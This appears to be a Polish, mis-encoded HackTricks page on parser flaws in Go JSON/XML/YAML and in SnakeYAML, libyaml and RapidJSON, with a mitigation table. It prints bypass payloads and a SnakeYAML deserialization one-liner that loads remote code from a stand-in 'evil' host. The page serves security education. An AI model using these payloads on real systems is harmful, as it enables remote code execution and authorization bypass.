# JSON, XML & Yaml Hacking & Issues

{{#include ../banners/hacktricks-training.md}}

## Go JSON Decoder

Wykryto nastÄ™pujÄ…ce problemy w Go JSON, chociaÅ¼ mogÄ… one wystÄ™powaÄ‡ rÃ³wnieÅ¼ w innych jÄ™zykach. Problemy te zostaÅ‚y opublikowane w [**tym wpisie na blogu**](https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/).

Parsers JSON, XML i YAML w Go majÄ… dÅ‚ugÄ… historiÄ™ niespÃ³jnoÅ›ci i niebezpiecznych domyÅ›lnych ustawieÅ„, ktÃ³re mogÄ… byÄ‡ wykorzystywane do **obejÅ›cia uwierzytelniania**, **eskalacji uprawnieÅ„** lub **ekstrakcji wraÅ¼liwych danych**.

### (Un)Marshaling Unexpected Data

Celem jest wykorzystanie struktur, ktÃ³re pozwalajÄ… atakujÄ…cemu na odczyt/zapis wraÅ¼liwych pÃ³l (np. `IsAdmin`, `Password`).

- PrzykÅ‚ad struktury:
```go
type User struct {
Username string `json:"username,omitempty"`
Password string `json:"password,omitempty"`
IsAdmin  bool   `json:"-"`
}
```
- Powszechne podatnoÅ›ci

1. **Brak tagu** (brak tagu = pole jest nadal analizowane domyÅ›lnie):
```go
type User struct {
Username string
}
```
Åadunek:
```json
{"Username": "admin"}
```
2. **NieprawidÅ‚owe uÅ¼ycie `-`**:
```go
type User struct {
IsAdmin bool `json:"-,omitempty"` // âŒ wrong
}
```
Åadunek:
```json
{"-": true}
```
âœ”ï¸ PrawidÅ‚owy sposÃ³b blokowania pola przed (de)serializacjÄ…:
```go
type User struct {
IsAdmin bool `json:"-"`
}
```
### RÃ³Å¼nice w parserach

Celem jest obejÅ›cie autoryzacji poprzez wykorzystanie sposobu, w jaki rÃ³Å¼ne parsery interpretujÄ… ten sam Å‚adunek w rÃ³Å¼ny sposÃ³b, jak w przypadku:
- CVE-2017-12635: obejÅ›cie Apache CouchDB za pomocÄ… zduplikowanych kluczy
- 2022: Zoom 0-click RCE poprzez niespÃ³jnoÅ›Ä‡ parsera XML
- GitLab 2025 obejÅ›cie SAML za pomocÄ… dziwactw XML


**1. Zduplikowane pola:**
Go's `encoding/json` bierze **ostatnie** pole.
```go
json.Unmarshal([]byte(`{"action":"UserAction", "action":"AdminAction"}`), &req)
fmt.Println(req.Action) // AdminAction
```
Inne parsery (np. Jackson w Javie) mogÄ… braÄ‡ **pierwszy**.

**2. NiejednoznacznoÅ›Ä‡ wielkoÅ›ci liter:**
Go jest niejednoznaczne pod wzglÄ™dem wielkoÅ›ci liter:
```go
json.Unmarshal([]byte(`{"AcTiOn":"AdminAction"}`), &req)
// matches `Action` field
```
Nawet sztuczki z Unicode dziaÅ‚ajÄ…:
```go
json.Unmarshal([]byte(`{"aâ„ªtionÅ¿": "bypass"}`), &req)
```
**3. Niedopasowanie miÄ™dzy usÅ‚ugami:**
WyobraÅº sobie:
- Proxy napisane w Go
- UsÅ‚uga AuthZ napisana w Pythonie

Napastnik wysyÅ‚a:
```json
{
"action": "UserAction",
"AcTiOn": "AdminAction"
}
```
- Python widzi `UserAction`, pozwala na to
- Go widzi `AdminAction`, wykonuje to


### Confuzja formatu danych (Polygloty)

Celem jest wykorzystanie systemÃ³w, ktÃ³re mieszajÄ… formaty (JSON/XML/YAML) lub otwierajÄ… siÄ™ na bÅ‚Ä™dy parsera, takie jak:
- **CVE-2020-16250**: HashiCorp Vault analizowaÅ‚ JSON za pomocÄ… parsera XML po tym, jak STS zwrÃ³ciÅ‚ JSON zamiast XML.

AtakujÄ…cy kontroluje:
- NagÅ‚Ã³wek `Accept: application/json`
- CzÄ™Å›ciowÄ… kontrolÄ™ nad ciaÅ‚em JSON

Parser XML w Go analizowaÅ‚ to **i tak** i ufaÅ‚ wstrzykniÄ™tej toÅ¼samoÅ›ci.

- Stworzony Å‚adunek:
```json
{
"action": "Action_1",
"AcTiOn": "Action_2",
"ignored": "<?xml version=\"1.0\"?><Action>Action_3</Action>"
}
```
- **Go JSON** parser: `Action_2` (niezaleÅ¼ne od wielkoÅ›ci liter + ostatnie wygrywa)
- **YAML** parser: `Action_1` (wraÅ¼liwy na wielkoÅ›Ä‡ liter)
- **XML** parser: analizuje `"Action_3"` wewnÄ…trz ciÄ…gu

---

## ZnaczÄ…ce luki w parserach (2023-2025)

> PoniÅ¼sze publicznie wykorzystywane problemy pokazujÄ…, Å¼e niebezpieczne analizowanie to problem wielojÄ™zyczny â€” nie tylko problem Go.

### SnakeYAML Deserialization RCE (CVE-2022-1471)

* Dotyczy: `org.yaml:snakeyaml` < **2.0** (uÅ¼ywane przez Spring-Boot, Jenkins itp.).
* Przyczyna: `new Constructor()` deserializuje **dowolne klasy Java**, umoÅ¼liwiajÄ…c Å‚aÅ„cuchy gadÅ¼etÃ³w, ktÃ³re koÅ„czÄ… siÄ™ wykonaniem zdalnego kodu.
* One-liner PoC (otworzy kalkulator na podatnym hoÅ›cie):
```yaml
!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://evil/"] ] ] ]
```
* Naprawa / Åagodzenie:
1. **Zaktualizuj do â‰¥2.0** (domyÅ›lnie uÅ¼ywa `SafeLoader`).
2. W starszych wersjach, wyraÅºnie uÅ¼yj `new Yaml(new SafeConstructor())`.

### libyaml Double-Free (CVE-2024-35325)

* Dotyczy: `libyaml` â‰¤0.2.5 (biblioteka C wykorzystywana przez wiele powiÄ…zaÅ„ jÄ™zykowych).
* Problem: WywoÅ‚anie `yaml_event_delete()` dwa razy prowadzi do podwÃ³jnego zwolnienia pamiÄ™ci, ktÃ³re napastnicy mogÄ… wykorzystaÄ‡ do DoS lub, w niektÃ³rych scenariuszach, do eksploatacji sterty.
* Status: ZgÅ‚oszenie odrzucone jako â€niewÅ‚aÅ›ciwe uÅ¼ycie APIâ€, ale dystrybucje Linuksa dostarczyÅ‚y poprawionÄ… wersjÄ™ **0.2.6**, ktÃ³ra defensywnie zeruje wskaÅºnik.

### RapidJSON Integer (Under|Over)-flow (CVE-2024-38517 / CVE-2024-39684)

* Dotyczy: Tencent **RapidJSON** przed zatwierdzeniem `8269bc2` (<1.1.0-patch-22).
* BÅ‚Ä…d: W `GenericReader::ParseNumber()` niekontrolowana arytmetyka pozwala napastnikom tworzyÄ‡ ogromne literaÅ‚y numeryczne, ktÃ³re owijajÄ… siÄ™ i uszkadzajÄ… stertÄ™ â€” ostatecznie umoÅ¼liwiajÄ…c eskalacjÄ™ uprawnieÅ„, gdy powstaÅ‚a graf obiektÃ³w jest uÅ¼ywana do podejmowania decyzji autoryzacyjnych.

---

### ğŸ” Åagodzenia (Zaktualizowane)

| Ryzyko                              | Naprawa / Rekomendacja                                      |
|-------------------------------------|------------------------------------------------------------|
| Nieznane pola (JSON)               | `decoder.DisallowUnknownFields()`                          |
| DuplikujÄ…ce siÄ™ pola (JSON)        | âŒ Brak naprawy w stdlib â€” waliduj za pomocÄ… [`jsoncheck`](https://github.com/dvsekhvalnov/johnny-five) |
| Dopasowanie bez uwzglÄ™dnienia wielkoÅ›ci liter (Go) | âŒ Brak naprawy â€” waliduj tagi struktury + wstÄ™pnie kanonizuj dane wejÅ›ciowe   |
| Åšmieciowe dane XML / XXE           | UÅ¼yj wzmocnionego parsera (`encoding/xml` + `DisallowDTD`)     |
| Nieznane klucze YAML                | `yaml.KnownFields(true)`                                   |
| **Niebezpieczna deserializacja YAML** | UÅ¼yj SafeConstructor / zaktualizuj do SnakeYAML â‰¥2.0            |
| libyaml â‰¤0.2.5 podwÃ³jne zwolnienie pamiÄ™ci | Zaktualizuj do **0.2.6** lub wersji poprawionej przez dystrybucjÄ™            |
| RapidJSON <poprawione zatwierdzenie | Kompiluj przeciwko najnowszemu RapidJSON (â‰¥lipiec 2024)              |

## OdnoÅ›niki

- Baeldung â€“ â€œRozwiÄ…zywanie CVE-2022-1471 z SnakeYAML 2.0â€
- Ubuntu Security Tracker â€“ CVE-2024-35325 (libyaml)

{{#include ../banners/hacktricks-training.md}}
